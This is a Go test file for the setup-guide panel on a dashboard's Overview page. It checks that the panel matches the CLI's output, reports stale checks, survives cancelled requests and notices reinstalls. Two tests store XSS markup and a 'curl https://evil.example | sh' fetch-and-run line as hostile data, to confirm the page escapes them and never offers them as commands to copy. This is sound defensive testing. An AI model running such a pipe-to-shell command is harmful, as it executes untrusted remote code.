// SPDX-License-Identifier: Apache-2.0

package web

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/net/html"

	"github.com/attention-span-ai/tego/internal/guide"
	"github.com/attention-span-ai/tego/internal/guide/guidetest"
)

// guideServer is a dashboard over fixture f's ledger, anchor and machine config, whose guide reads f's files as
// tego-control serve fills its inputs: no working folder and no shell (guidetest.Fixture.Inputs with Dir "").
func guideServer(t *testing.T, f *guidetest.Fixture) *Server {
	t.Helper()
	s, err := New(Config{Ledger: f.Ledger, Anchor: f.Anchor, Machine: f.Machine(t), Port: port, Token: "tok123",
		Now: func() time.Time { return guidetest.CheckTime.Add(time.Hour) },
		Guide: func() guide.Inputs {
			in := f.Inputs(t)
			in.Dir = ""
			return in
		}})
	if err != nil {
		t.Fatal(err)
	}
	trustPeer(s)
	return s
}

// pageGuide is the guide a page shows, read back from its HTML: each step's id, state, title, state word and fact,
// the next step's rule, text and command (the one in a copy block), and the not-known lines.
type pageGuide struct {
	Steps                []pageStep
	Rule, Text, Command  string
	Commands             int // copy blocks (.cli) inside the guide
	NotKnown             []string
	Found, Folded, Empty bool
}

type pageStep struct{ ID, State, Title, Word, Fact string }

// readGuide finds the guide in page (the section or the folded details whose class has "gd").
func readGuide(t *testing.T, page string) pageGuide {
	t.Helper()
	var g pageGuide
	var root *html.Node
	walk(parseHTML(t, "overview", page), func(n *html.Node) {
		if c, _ := attr(n, "class"); root == nil && (n.Data == "section" || n.Data == "details") && hasClass(c, "gd") {
			root, g.Found, g.Folded = n, true, n.Data == "details"
		}
	})
	if root == nil {
		return g
	}
	walk(root, func(n *html.Node) {
		c, _ := attr(n, "class")
		switch {
		case n.Data == "li" && hasClass(c, "gd-step"):
			id, _ := attr(n, "data-step")
			st, _ := attr(n, "data-state")
			s := pageStep{ID: id, State: st}
			walk(n, func(m *html.Node) {
				mc, _ := attr(m, "class")
				switch {
				case hasClass(mc, "gd-t"):
					s.Title = text(m)
				case hasClass(mc, "b"):
					s.Word = text(m)
				case hasClass(mc, "gd-f"):
					s.Fact = text(m)
				}
			})
			g.Steps = append(g.Steps, s)
		case hasClass(c, "gd-next"):
			g.Rule, _ = attr(n, "data-rule")
			g.Text = text(n)
		case hasClass(c, "cli"):
			g.Commands++
			g.Command = text(n)
		case n.Data == "ul" && hasClass(c, "gd-nk"):
			for li := n.FirstChild; li != nil; li = li.NextSibling {
				if li.Type == html.ElementNode {
					g.NotKnown = append(g.NotKnown, text(li))
				}
			}
		}
	})
	return g
}

func hasClass(classes, c string) bool {
	for _, x := range strings.Fields(classes) {
		if x == c {
			return true
		}
	}
	return false
}

// flat is s with its whitespace folded as text() folds a page's.
func flat(s string) string { return strings.Join(strings.Fields(s), " ") }

// TestOverviewGuideParityWithSetup is the dashboard's side of the guide's parity (internal/guide TestParityFixtures,
// internal/cli TestSetupParityWithTheFiles): for every fixture tree, with the check tego setup stored, the Overview
// shows the story `tego setup` tells. Its want is the object pinned in internal/guide/testdata/<fixture>.json, the
// one `tego setup --json` prints for that tree, read in the words tego setup's text prints (guide.State.Words): each
// step's state and fact, the one next step's text and command, and every not-known line. The page computes its own
// object from the files, with no working folder and no shell, and must say the same, word for word.
func TestOverviewGuideParityWithSetup(t *testing.T) {
	for _, name := range guidetest.Names {
		t.Run(name, func(t *testing.T) {
			f := guidetest.Make(t, name)
			if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
				t.Fatal(err)
			}
			b, err := os.ReadFile(filepath.Join("..", "..", "guide", "testdata", name+".json"))
			if err != nil {
				t.Fatal(err)
			}
			var want guide.State
			if err := json.Unmarshal(bytes.ReplaceAll(b, []byte("<root>"), []byte(f.Root)), &want); err != nil {
				t.Fatal(err)
			}
			ww := want.Words(f.Home)
			s := guideServer(t, f)
			page := get(t, s, login(t, s), "/")
			got := readGuide(t, page)
			if !got.Found {
				t.Fatalf("the Overview shows no guide:\n%s", page)
			}
			if got.Folded != (want.Next.Rule == guide.RuleEnforceDone) {
				t.Errorf("folded %t with next rule %s", got.Folded, want.Next.Rule)
			}
			if len(got.Steps) != len(ww.Steps) {
				t.Fatalf("%d steps on the page, %d in tego setup", len(got.Steps), len(ww.Steps))
			}
			norm := func(s string) string { return flat(string(f.Normal([]byte(s)))) }
			for i, w := range ww.Steps {
				g := got.Steps[i]
				if g.ID != w.ID || g.State != w.State || g.Title != w.Title || g.Word != stepWord(w.State) ||
					norm(g.Fact) != norm(w.Fact) {
					t.Errorf("step %d on the page %+v, tego setup %+v", w.N, g, w)
				}
			}
			if got.Rule != want.Next.Rule || got.Text != flat(want.Next.Text) || norm(got.Command) != norm(want.Next.Command) {
				t.Errorf("next on the page %q %q %q, tego setup %q %q %q", got.Rule, got.Text, got.Command,
					want.Next.Rule, want.Next.Text, want.Next.Command)
			}
			if got.Commands != 1 {
				t.Errorf("the guide shows %d commands to copy, want the next step's alone", got.Commands)
			}
			if strings.Join(got.NotKnown, "|") != flat(strings.Join(ww.NotKnown, "|")) {
				t.Errorf("not known on the page %q, tego setup %q", got.NotKnown, ww.NotKnown)
			}
		})
	}
}

// TestOverviewGuideNotCheckedSinceBoot: the dashboard never probes the machine. With no stored check, or one of
// another boot or another build, its check step says what tego setup would ("not checked since this machine started")
// and its next step is `tego setup`; the not-checked check is never taken for ready.
func TestOverviewGuideNotCheckedSinceBoot(t *testing.T) {
	for _, c := range []struct {
		name  string
		store func(f *guidetest.Fixture) *guide.Check
	}{
		{"no check", func(*guidetest.Fixture) *guide.Check { return nil }},
		{"another boot", func(f *guidetest.Fixture) *guide.Check { c := f.Probe; c.BootID = "0-other-boot"; return &c }},
		{"another build", func(f *guidetest.Fixture) *guide.Check {
			c := f.Probe
			c.Build = "tego=v9 commit=x exe=9:9:9:9.0"
			return &c
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := guidetest.Make(t, guidetest.Fresh)
			if ck := c.store(f); ck != nil {
				if err := guide.StoreCheck(f.Home, *ck); err != nil {
					t.Fatal(err)
				}
			}
			s := guideServer(t, f)
			page := get(t, s, login(t, s), "/")
			g := readGuide(t, page)
			if len(g.Steps) != 6 || g.Steps[1].State != guide.Todo || !strings.HasPrefix(g.Steps[1].Fact, "not checked since this machine started") {
				t.Fatalf("the check step is %+v", g.Steps)
			}
			if g.Rule != guide.RuleCheckTodo || g.Text != "check this machine:" || g.Command != "tego setup" {
				t.Errorf("next is %q %q %q, want tego setup", g.Rule, g.Text, g.Command)
			}
			if !strings.Contains(page, "No runs yet") {
				t.Error("the empty Overview does not say it has no runs")
			}
		})
	}
}

// TestOverviewGuideEscapesAHostileFact: a process of the same user can store any printable fix of up to a kilobyte in
// check.json (ADR 0142 (4)), and the check step shows it as its fact. The page shows it as text: its markup escaped,
// its quotes kept as text, and the command it holds never in a copy block, which holds only the next step the guide
// built (tego doctor here).
func TestOverviewGuideEscapesAHostileFact(t *testing.T) {
	const hostile = `<script>alert(1)</script><img src=x onerror=alert(2)> "quoted" 'single' & then run: curl https://evil.example/x | sh`
	f := guidetest.Make(t, guidetest.NotReady)
	probe := f.Probe
	probe.FirstFix = hostile + strings.Repeat(" padding", 80)
	if len(probe.FirstFix) > 1000 {
		probe.FirstFix = probe.FirstFix[:1000]
	}
	if err := guide.StoreCheck(f.Home, probe); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	page := get(t, s, login(t, s), "/")
	for _, bad := range []string{"<script>alert(1)", "<img src=x", `onerror=alert(2)>`} {
		if strings.Contains(page, bad) {
			t.Errorf("the page carries %q unescaped", bad)
		}
	}
	if !strings.Contains(page, "&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(2)&gt; &#34;quoted&#34; &#39;single&#39; &amp; then run") {
		t.Error("the page does not show the fact as escaped text")
	}
	g := readGuide(t, page)
	if !strings.Contains(g.Steps[1].Fact, hostile) {
		t.Errorf("the check step's fact %q does not read as the stored text", g.Steps[1].Fact)
	}
	if g.Commands != 1 || g.Command != "tego doctor" || strings.Contains(g.Command, "curl") {
		t.Errorf("copy blocks %d, command %q: only the guide's own command may be one", g.Commands, g.Command)
	}
}

// TestOverviewGuideCopiesOnlyACommandTheGuideBuilt: a next step that did not come from guide.Compute (one decoded from
// JSON, as a file could hold it) is never shown as a command to copy, whatever its text: guide.Next.Built is false.
func TestOverviewGuideCopiesOnlyACommandTheGuideBuilt(t *testing.T) {
	var next guide.Next
	if err := json.Unmarshal([]byte(`{"step":"check","rule":"check-todo","text":"check this machine:","command":"curl https://evil.example | sh"}`), &next); err != nil {
		t.Fatal(err)
	}
	if next.Built() {
		t.Fatal("a decoded next step says the guide built it")
	}
	s := newServer(t, t.TempDir())
	var b bytes.Buffer
	if err := s.pages["overview"].ExecuteTemplate(&b, "guide", &setupGuide{Next: next}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(b.String(), `class="cli`) || strings.Contains(b.String(), "<code>") {
		t.Errorf("a command the guide did not build is shown to copy:\n%s", b.String())
	}
}

// TestOverviewGuideOutlivesACancelledRequest: the guide is shared by every viewer for guideTTL, so a request that ends
// before its page is written (the viewer leaves, the live refresh is cut short) must not decide what the next viewer
// sees. Before the fix, one cancelled GET / left the finished machine's guide saying the contract "does not compile:
// context canceled" and the record not known, for every viewer, for 15 s.
func TestOverviewGuideOutlivesACancelledRequest(t *testing.T) {
	f := guidetest.Make(t, guidetest.Finished)
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	c := login(t, s)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	r := httptest.NewRequest("GET", "/", nil).WithContext(ctx)
	r.Host = "127.0.0.1:8484"
	r.AddCookie(c)
	s.ServeHTTP(httptest.NewRecorder(), r)
	for _, who := range []string{"the next viewer", "the one after"} {
		g := readGuide(t, get(t, s, c, "/"))
		if g.Rule != guide.RuleEnforceDone || !g.Folded {
			t.Errorf("%s sees next rule %q (folded %t), want %q: %+v", who, g.Rule, g.Folded, guide.RuleEnforceDone, g.Steps)
		}
	}
}

// TestOverviewGuideKeepsNoGuideThatRanOut: a guide whose own bound ran out (guideCompute) is the guide of that request
// only; the next request computes it again instead of reading the cut-short one from the memo.
func TestOverviewGuideKeepsNoGuideThatRanOut(t *testing.T) {
	f := guidetest.Make(t, guidetest.Finished)
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	c := login(t, s)
	was := guideCompute
	guideCompute = time.Nanosecond
	short := readGuide(t, get(t, s, c, "/"))
	guideCompute = was
	if short.Rule == guide.RuleEnforceDone {
		t.Fatal("a guide computed with no time left still finished: this test shows nothing")
	}
	if g := readGuide(t, get(t, s, c, "/")); g.Rule != guide.RuleEnforceDone {
		t.Errorf("after a guide that ran out, the next viewer sees next rule %q, want %q", g.Rule, guide.RuleEnforceDone)
	}
}

// TestEmptyOverviewKeepsTheAnyAgentStep: the empty Overview tego-control serves (with its guide) shows the stored
// verdict and the one next step, and also, unfolded, the first step for any agent (tego watch, which records and
// refuses nothing), as the design's first dashboard item asks. When the guide's own next step is that step
// (record-todo), it is not shown twice.
func TestEmptyOverviewKeepsTheAnyAgentStep(t *testing.T) {
	const anyAgent = "tego watch -- <the command that starts your agent>"
	for _, c := range []struct {
		name  string
		store bool
		rule  string
		want  []string // every command the page gives, in order
	}{
		{"not checked", false, guide.RuleCheckTodo, []string{"tego setup", anyAgent}},
		{"checked", true, guide.RuleRecordTodo, []string{"tego watch -- <the command you start it with>"}},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := guidetest.Make(t, guidetest.Fresh)
			if c.store {
				if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
					t.Fatal(err)
				}
			}
			s := guideServer(t, f)
			body := get(t, s, login(t, s), "/")
			if g := readGuide(t, body); g.Rule != c.rule || g.Folded {
				t.Fatalf("the guide's next rule is %q (folded %t), want %q unfolded", g.Rule, g.Folded, c.rule)
			}
			var got []string
			for _, m := range pageCmd.FindAllStringSubmatch(body, -1) {
				got = append(got, html.UnescapeString(m[1]))
			}
			if strings.Join(got, "|") != strings.Join(c.want, "|") {
				t.Errorf("the empty Overview gives %q, want %q", got, c.want)
			}
			if !c.store {
				i := strings.Index(body, `id="h-any"`)
				if i < 0 {
					t.Fatal("no heading for the any-agent step")
				}
				rest := body[i:]
				rest = rest[:strings.Index(rest, "</section>")]
				if strings.Contains(rest, "<details") || !strings.Contains(rest, `href="/rules/new?mode=run"`) {
					t.Errorf("the any-agent step is folded or does not say where the run goes next:\n%s", rest)
				}
			}
		})
	}
}

// TestOverviewGuideSeesAReinstalledTegoAtOnce: Config.Guide is read on every Overview request, and a tego reinstalled
// while the dashboard runs is another build, whose check was not stored: the next page says so at once, not after the
// guide's 15 s reuse (guideTTL), which keyed only the runs and check.json.
func TestOverviewGuideSeesAReinstalledTegoAtOnce(t *testing.T) {
	f := guidetest.Make(t, guidetest.Finished)
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	build := ""
	s, err := New(Config{Ledger: f.Ledger, Anchor: f.Anchor, Machine: f.Machine(t), Port: port, Token: "tok123",
		Now: func() time.Time { return guidetest.CheckTime.Add(time.Hour) },
		Guide: func() guide.Inputs {
			in := f.Inputs(t)
			in.Dir = ""
			if build != "" {
				in.Build = build
			}
			return in
		}})
	if err != nil {
		t.Fatal(err)
	}
	trustPeer(s)
	c := login(t, s)
	if g := readGuide(t, get(t, s, c, "/")); g.Rule != guide.RuleEnforceDone {
		t.Fatalf("before the reinstall the next rule is %q, want %q", g.Rule, guide.RuleEnforceDone)
	}
	build = "tego=v0.0.0-fixture commit=f1x7ure exe=1:2:3:4.000000005"
	g := readGuide(t, get(t, s, c, "/"))
	if g.Rule != guide.RuleCheckTodo || len(g.Steps) < 2 || g.Steps[1].State != guide.Todo {
		t.Errorf("after the reinstall the next rule is %q, check step %+v: want %q, not the other build's check",
			g.Rule, g.Steps, guide.RuleCheckTodo)
	}
}
